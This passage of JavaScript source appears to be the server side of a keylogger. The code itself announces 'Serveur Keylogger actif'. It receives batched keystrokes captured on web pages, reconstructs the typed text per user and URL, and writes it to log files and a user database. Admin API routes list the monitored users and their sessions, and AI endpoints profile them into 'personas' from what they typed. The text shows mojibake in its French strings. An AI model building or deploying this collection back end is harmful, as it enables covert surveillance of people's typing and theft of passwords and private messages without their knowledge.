const DATA_DIR = path.join(__dirname, 'data');
const USERS_DB = path.join(DATA_DIR, 'users.json');

// Cr√©er les dossiers s'ils n'existent pas
[LOGS_DIR, DATA_DIR].forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// Initialiser la base de donn√©es utilisateurs
if (!fs.existsSync(USERS_DB)) {
    fs.writeFileSync(USERS_DB, JSON.stringify({ users: {} }, null, 2));
}

// Fonctions de base de donn√©es
function readUsersDB() {
    try {
        const data = fs.readFileSync(USERS_DB, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return { users: {} };
    }
}

function writeUsersDB(data) {
    fs.writeFileSync(USERS_DB, JSON.stringify(data, null, 2));
}

function addSession(userId, sessionData) {
    const db = readUsersDB();

    if (!db.users[userId]) {
        db.users[userId] = {
            userId: userId,
            firstSeen: new Date().toISOString(),
            lastSeen: new Date().toISOString(),
            totalSessions: 0,
            totalKeystrokes: 0,
            sessions: []
        };
    }

    db.users[userId].sessions.push({
        ...sessionData,
        sessionId: Date.now() + '_' + Math.random().toString(36).substr(2, 9),
        receivedAt: new Date().toISOString()
    });

    db.users[userId].lastSeen = new Date().toISOString();
    db.users[userId].totalSessions++;
    db.users[userId].totalKeystrokes += sessionData.keystrokes.length;

    writeUsersDB(db);
    return db.users[userId];
}

// Fonction pour formater les touches en texte lisible
function formatKeystrokes(keystrokes) {
    let text = '';
    keystrokes.forEach(k => {
        if (k.key.length === 1 && !k.isSpecialKey) {
            text += k.key;
        } else if (k.key === 'Backspace' && text.length > 0) {
            text = text.slice(0, -1);
        } else if (k.key === 'Enter') {
            text += '\n';
        } else if (k.key === 'Tab') {
            text += '\t';
        } else if (k.key === ' ') {
            text += ' ';
        } else if (k.isSpecialKey) {
            text += ` [${k.key}] `;
        }
    });
    return text;
}

// Fonction pour cr√©er un nom de fichier s√ªr
function sanitizeFilename(url) {
    try {
        const urlObj = new URL(url);
        const hostname = urlObj.hostname.replace(/^www\./, '');
        const pathname = urlObj.pathname.replace(/\//g, '_').replace(/[^a-zA-Z0-9_-]/g, '');
        return `${hostname}${pathname || '_index'}`.substring(0, 200);
    } catch (error) {
        return 'unknown_site';
    }
}

// Fonction pour cr√©er un tableau format√©
function createFormattedTable(pageData) {
    const { url, title, startTime, endTime, keystrokes, userId } = pageData;

    const startDate = new Date(startTime);
    const endDate = new Date(endTime);
    const duration = Math.round((endDate - startDate) / 1000);

    let output = '';
    output += '‚ïê'.repeat(80) + '\n';
    output += '  HISTORIQUE DES TOUCHES CLIQU√âES\n';
    output += '‚ïê'.repeat(80) + '\n\n';

    output += '‚îå‚îÄ INFORMATIONS DE LA SESSION ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n';
    output += `‚îÇ Utilisateur : ${userId}\n`;
    output += `‚îÇ Site Web    : ${title}\n`;
    output += `‚îÇ URL         : ${url}\n`;
    output += `‚îÇ D√©but       : ${startDate.toLocaleString('fr-FR')}\n`;
    output += `‚îÇ Fin         : ${endDate.toLocaleString('fr-FR')}\n`;
    output += `‚îÇ Dur√©e       : ${duration} secondes\n`;
    output += `‚îÇ Touches     : ${keystrokes.length} touches enregistr√©es\n`;
    output += '‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n\n';

    output += '‚îå‚îÄ TEXTE SAISI ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n';
    const text = formatKeystrokes(keystrokes);
    const lines = text.split('\n');
    lines.forEach(line => {
        if (line.trim()) {
            output += `‚îÇ ${line}\n`;
        }
    });
    output += '‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n\n';

    output += '‚îå‚îÄ D√âTAIL DES TOUCHES ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n';
    output += '‚îÇ Heure      ‚îÇ Touche        ‚îÇ Input                  ‚îÇ Modificateurs  ‚îÇ\n';
    output += '‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n';

    keystrokes.forEach(k => {
        const time = new Date(k.timestamp).toLocaleTimeString('fr-FR');
        const key = k.key.padEnd(13);
        const input = (k.inputType || 'N/A').padEnd(22);
        const mods = [];
        if (k.ctrlKey) mods.push('Ctrl');
        if (k.altKey) mods.push('Alt');
        if (k.shiftKey) mods.push('Shift');
        if (k.metaKey) mods.push('Cmd');
        const modifiers = (mods.join('+') || '-').padEnd(14);

        output += `‚îÇ ${time} ‚îÇ ${key} ‚îÇ ${input} ‚îÇ ${modifiers} ‚îÇ\n`;
    });

    output += '‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n\n';

    return output;
}

// ===== ROUTES API =====

// Route principale
app.get('/', (req, res) => {
    res.json({
        message: 'Serveur Keylogger actif',
        endpoints: {
            'POST /batch-data': 'Enregistrer une session',
            'GET /api/users': 'Liste des utilisateurs',
            'GET /api/users/:userId': 'D√©tails d\'un utilisateur',
            'GET /api/stats': 'Statistiques globales',
            'GET /admin': 'Interface admin'
        }
    });
});

// Recevoir les donn√©es group√©es
app.post('/batch-data', (req, res) => {
    const pageData = req.body;

    if (!pageData || !pageData.url || !pageData.keystrokes || !pageData.userId) {
        return res.status(400).json({ error: 'Donn√©es invalides' });
    }

    try {
        // Ajouter √† la base de donn√©es utilisateurs
        const user = addSession(pageData.userId, pageData);

        // Cr√©er le fichier TXT
        const filename = sanitizeFilename(pageData.url);
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filepath = path.join(LOGS_DIR, `${pageData.userId}_${filename}_${timestamp}.txt`);

        const content = createFormattedTable(pageData);
        fs.writeFileSync(filepath, content, 'utf8');

        console.log(`\nüìù Session enregistr√©e: ${path.basename(filepath)}`);
        console.log(`   User: ${pageData.userId} | ${pageData.keystrokes.length} touches sur ${pageData.url}`);

        res.json({
            success: true,
            message: 'Session enregistr√©e',
            filename: path.basename(filepath),
            user: {
                userId: user.userId,
                totalSessions: user.totalSessions,
                totalKeystrokes: user.totalKeystrokes
            }
        });
    } catch (error) {
        console.error('Erreur lors de l\'enregistrement:', error);
        res.status(500).json({ error: 'Erreur lors de l\'enregistrement' });
    }
});

// API: Liste des utilisateurs
app.get('/api/users', (req, res) => {
    try {
        const db = readUsersDB();
        const usersList = Object.values(db.users).map(user => ({
            userId: user.userId,
            firstSeen: user.firstSeen,
            lastSeen: user.lastSeen,
            totalSessions: user.totalSessions,
            totalKeystrokes: user.totalKeystrokes,
            sessionsCount: user.sessions.length
        }));

        res.json({ users: usersList, total: usersList.length });
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors de la lecture des utilisateurs' });
    }
});

// API: D√©tails d'un utilisateur
app.get('/api/users/:userId', (req, res) => {
    try {
        const db = readUsersDB();
        const user = db.users[req.params.userId];

        if (!user) {
            return res.status(404).json({ error: 'Utilisateur non trouv√©' });
        }

        res.json(user);
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors de la lecture de l\'utilisateur' });
    }
});

// API: Statistiques globales
app.get('/api/stats', (req, res) => {
    try {
        const db = readUsersDB();
        const users = Object.values(db.users);

        const stats = {
            totalUsers: users.length,
            totalSessions: users.reduce((sum, u) => sum + u.totalSessions, 0),
            totalKeystrokes: users.reduce((sum, u) => sum + u.totalKeystrokes, 0),
            activeToday: users.filter(u => {
                const lastSeen = new Date(u.lastSeen);
                const today = new Date();
                return lastSeen.toDateString() === today.toDateString();
            }).length
        };

        res.json(stats);
    } catch (error) {
        res.status(500).json({ error: 'Erreur lors du calcul des stats' });
    }
});

// D√©marrer le serveur
app.listen(PORT, () => {
    console.log(`
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë   üîê Serveur Keylogger d√©marr√©            ‚ïë
‚ïë                                            ‚ïë
‚ïë   üì° Port: ${PORT}                            ‚ïë
‚ïë   üåê URL: http://localhost:${PORT}            ‚ïë
‚ïë   üìä Admin: http://localhost:${PORT}/admin    ‚ïë
‚ïë   üìÅ Logs: ${path.basename(LOGS_DIR)}/                       ‚ïë
‚ïë                                            ‚ïë
‚ïë   Pr√™t √† recevoir les donn√©es...          ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
  `);
    console.log(`üìÇ Base de donn√©es: ${USERS_DB}\n`);
});

// Gestion de l'arr√™t propre
process.on('SIGINT', () => {
    console.log('\nüëã Arr√™t du serveur...');
    process.exit(0);
});

// ===== AI ANALYSIS ENDPOINTS =====

// Analyser un utilisateur et g√©n√©rer un persona
app.post('/api/users/:userId/analyze', async (req, res) => {
  try {
    const db = readUsersDB();
    const user = db.users[req.params.userId];
    
    if (!user) {
      return res.status(404).json({ error: 'Utilisateur non trouv√©' });
    }
    
    console.log(`ü§ñ Analyse IA en cours pour ${user.userId}...`);
    const analysis = await analyzeUserPersona(user);
    
    // Sauvegarder dans le cache
    const cache = JSON.parse(fs.readFileSync(AI_CACHE_FILE, 'utf8'));
    cache.personas[user.userId] = {
      ...analysis,
      generatedAt: new Date().toISOString()
    };
    fs.writeFileSync(AI_CACHE_FILE, JSON.stringify(cache, null, 2));
    
    console.log(`‚úÖ Persona g√©n√©r√© pour ${user.userId}`);
    res.json(analysis);
  } catch (error) {
    console.error('Erreur analyse IA:', error);
    res.status(500).json({ error: 'Erreur lors de l\'analyse IA' });
  }
});

// R√©cup√©rer le persona d'un utilisateur
app.get('/api/users/:userId/persona', async (req, res) => {
  try {
    const cache = JSON.parse(fs.readFileSync(AI_CACHE_FILE, 'utf8'));
    const cached = cache.personas[req.params.userId];
    
    if (cached && (new Date() - new Date(cached.generatedAt)) < 24 * 60 * 60 * 1000) {
      return res.json(cached);
    }
    
    const db = readUsersDB();
    const user = db.users[req.params.userId];
    
    if (!user) {
      return res.status(404).json({ error: 'Utilisateur non trouv√©' });
    }
    
    const analysis = await analyzeUserPersona(user);
    cache.personas[req.params.userId] = {
      ...analysis,
      generatedAt: new Date().toISOString()
    };
    fs.writeFileSync(AI_CACHE_FILE, JSON.stringify(cache, null, 2));
    
    res.json(analysis);
  } catch (error) {
    res.status(500).json({ error: 'Erreur lors de la r√©cup√©ration du persona' });
  }
});

// Analyser les tendances globales
app.get('/api/trends', async (req, res) => {
  try {
    const db = readUsersDB();
    const users = Object.values(db.users);
    
    console.log('ü§ñ Analyse des tendances globales...');
    const trends = await analyzeGlobalTrends(users);
    
    const cache = JSON.parse(fs.readFileSync(AI_CACHE_FILE, 'utf8'));
    cache.globalTrends = {
      ...trends,
      generatedAt: new Date().toISOString()
    };
    fs.writeFileSync(AI_CACHE_FILE, JSON.stringify(cache, null, 2));
    
    console.log('‚úÖ Tendances globales g√©n√©r√©es');
    res.json(trends);
  } catch (error) {
    console.error('Erreur analyse tendances:', error);
    res.status(500).json({ error: 'Erreur lors de l\'analyse des tendances' });
  }
});
